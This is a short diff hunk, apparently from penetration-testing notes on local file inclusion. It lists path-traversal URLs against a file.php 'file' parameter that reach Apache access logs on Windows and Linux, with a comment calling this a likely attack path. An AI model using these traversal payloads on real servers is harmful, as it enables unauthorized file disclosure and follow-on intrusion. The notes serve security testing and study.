@@ -19,7 +19,7 @@
 	#Check can you read / access the log file? This a good first indication that might be the attack path.
 	#Apache
 	1. Windows: http://example.com/file.php?file=/../../../xampp/apache2/logs/access.log | /../../../xampp/apache/logs/access.log
-	2. Linux: http://example.com/file.php?file=/../../../var/log/apache2/access.log | http://example.com/file.php?file=/../../../var/log/apache/access.log
+	2. Linux: http://example.com/file.php?file=/../../../var/log/apache2/access.log | /../../../var/log/apache/access.log
 	3. 
 ```
 ##### PT
